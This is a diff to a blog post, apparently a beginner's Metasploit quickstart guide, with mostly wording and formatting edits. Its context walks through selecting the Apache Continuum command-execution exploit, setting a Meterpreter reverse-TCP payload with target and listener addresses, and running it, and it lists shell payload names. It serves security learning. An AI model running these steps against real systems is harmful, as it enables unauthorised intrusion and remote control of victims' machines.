@@ -1,6 +1,7 @@
 ---
 layout: post
 title: Metasploit Quickstart Guide
+tags: Tech Metasploit Security Quickstart
 ---
 
 This guide is created by a beginner for beginners and designed to help get you familiar with 
@@ -16,7 +17,8 @@ The easiest way to start using Metasploit right away without needing to install 
 the official <a href="https://store.docker.com/community/images/kalilinux/kali-linux-docker" target ="_blank">Kali Linux Docker container</a>. 
 You don't need to have experience with <a href="https://www.docker.com/" target="_blank">Docker</a>, 
 but you will need to have it installed on your machine from the 
-<a href="https://store.docker.com/search?offering=community&type=edition" target="_blank">Docker Store</a>. 
+<a href="https://store.docker.com/search?offering=community&type=edition" target="_blank">Docker Store</a>. If you prefer to install Metasploit on your machine, you can follow the instructions <a href="https://help.rapid7.com/metasploit/Content/installation-and-updates/installing-msf.html" target="_blank">here</a>.
+
 To start the Docker container and install Metasploit, use the following commands:
 ```
 $ docker run -it kalilinux/kali-linux-docker bash
@@ -146,11 +148,11 @@ Matching Modules
    exploit/linux/http/dlink_upnp_exec_noauth                   2013-07-05       normal     D-Link Devices UPnP SOAP Command Execution
    ...
 ```
-Next, let's say that we decided to use one of the shown modules, e.g. `exploit/linux/http/apache_continuum_cmd_exec`
+Next, let's say that we decided to use one of the shown exploits, e.g. `linux/http/apache_continuum_cmd_exec`
 ```
 msf> use exploit/linux/http/apache_continuum_cmd_exec
 ```
-By selecting a module, we have switched from the global context to the module context. To get more info about the selected module:
+By selecting a module, we have switched from the global context to that module context. To get more info about the selected module:
 ```
 msf exploit(apache_continuum_cmd_exec) > info
 ```
@@ -197,7 +199,7 @@ Description:
 References:
   https://www.exploit-db.com/exploits/39886
 ```
-Alternatively, we may only care about the options of the module:
+Typically, we would only care about the `options` of the module:
 ```
 msf exploit(apache_continuum_cmd_exec) > options
 ```
@@ -229,20 +231,7 @@ Compatible Payloads
 ===================
    Name                                      Disclosure Date  Rank    Description
    ----                                      ---------------  ----    -----------
-   generic/custom                                             normal  Custom Payload
-   generic/debug_trap                                         normal  Generic x86 Debug Trap
-   generic/shell_bind_tcp                                     normal  Generic Command Shell, Bind TCP Inline
-   generic/shell_reverse_tcp                                  normal  Generic Command Shell, Reverse TCP Inline
-   generic/tight_loop                                         normal  Generic x86 Tight Loop
-   linux/x64/exec                                             normal  Linux Execute Command
-   linux/x64/mettle/bind_tcp                                  normal  Linux Mettle x64, Bind TCP Stager
-   linux/x64/mettle/reverse_tcp                               normal  Linux Mettle x64, Reverse TCP Stager
-   linux/x64/mettle_reverse_tcp                               normal  Linux Meterpreter
-   linux/x64/shell/bind_tcp                                   normal  Linux Command Shell, Bind TCP Stager
-   linux/x64/shell/reverse_tcp                                normal  Linux Command Shell, Reverse TCP Stager
-   linux/x64/shell_bind_tcp                                   normal  Linux Command Shell, Bind TCP Inline
-   linux/x64/shell_bind_tcp_random_port                       normal  Linux Command Shell, Bind TCP Random Port Inline
-   linux/x64/shell_reverse_tcp                                normal  Linux Command Shell, Reverse TCP Inline
+   ...
    linux/x86/chmod                                            normal  Linux Chmod
    linux/x86/exec                                             normal  Linux Execute Command
    linux/x86/meterpreter/bind_ipv6_tcp                        normal  Linux Meterpreter, Bind IPv6 TCP Stager (Linux x86)
@@ -255,14 +244,18 @@ Compatible Payloads
    linux/x86/meterpreter/reverse_tcp                          normal  Linux Meterpreter, Reverse TCP Stager
    ...
 ```
-Now, we need to select one of the payloads for our attack:
+Next, we need to select one of the payloads for our attack:
 ```
 msf exploit(apache_continuum_cmd_exec) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
+```
+```
 PAYLOAD => linux/x86/meterpreter/reverse_tcp
-
-
+```
+Now, let's check the selected payload options:
+```
 msf exploit(apache_continuum_cmd_exec) > options 
-
+```
+<pre><code>
 Module options (exploit/linux/http/apache_continuum_cmd_exec):
 
    Name     Current Setting  Required  Description
@@ -277,36 +270,38 @@ Module options (exploit/linux/http/apache_continuum_cmd_exec):
    URIPATH                   no        The URI to use for this exploit (default is random)
    VHOST                     no        HTTP server virtual host
 
-Payload options (linux/x86/meterpreter/reverse_tcp):
+<b>Payload options (linux/x86/meterpreter/reverse_tcp):</b>
 
    Name          Current Setting  Required  Description
    ----          ---------------  --------  -----------
    DebugOptions  0                no        Debugging options for POSIX meterpreter
    LHOST                          yes       The listen address
    LPORT         4444             yes       The listen port
-
 ...
-```
-Now, we need to set the remote host (`RHOST`) and the local host (`LHOST`) addresses as they are required options:
+</code></pre>
+We need to set the remote host (`RHOST`) and the local host (`LHOST`) addresses as they are required options:
 ```
 msf exploit(apache_continuum_cmd_exec) > set RHOST 192.168.1.10
-
+```
+```
 RHOST => 192.168.1.10
-
-
+```
+```
 msf exploit(apache_continuum_cmd_exec) > set LHOST 192.168.1.15
-
+```
+```
 LHOST => 192.168.1.15
-
-
+```
+```
 msf exploit(apache_continuum_cmd_exec) > options
-
+```
+<pre><code>
 Module options (exploit/linux/http/apache_continuum_cmd_exec):
 
    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
    Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOST    192.168.1.10     yes       The target address
+   <b>RHOST    192.168.1.10     yes       The target address</b>
    RPORT    8080             yes       The target port (TCP)
    SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
    SRVPORT  8080             yes       The local port to listen on.
@@ -320,10 +315,10 @@ Payload options (linux/x86/meterpreter/reverse_tcp):
    Name          Current Setting  Required  Description
    ----          ---------------  --------  -----------
    DebugOptions  0                no        Debugging options for POSIX meterpreter
-   LHOST         192.168.1.15     yes       The listen address
+   <b>LHOST         192.168.1.15     yes       The listen address</b>
    LPORT         4444             yes       The listen port
-```
-Next, we run the exploit:
+</code></pre>
+Now, we run the exploit:
 ```
 msf exploit(apache_continuum_cmd_exec) > run
 ```
@@ -343,6 +338,6 @@ at `192.168.1.10`
 - <a href="http://www.nostarch.com/metasploit" target="_blank">Metasploit - The Penetration Tester's Guide</a>
 - <a href="http://resources.metasploit.com" target="_blank">Metasploit External Resource Portal</a>
 
-**To seek help**:
+**To get help**:
 - <a href="https://community.rapid7.com/community/metasploit" target="_blank">Rapid7 Community</a>
 - <a href="https://security.stackexchange.com/questions/tagged/metasploit" target= "_blank">Information Security - Stack Exchange</a>
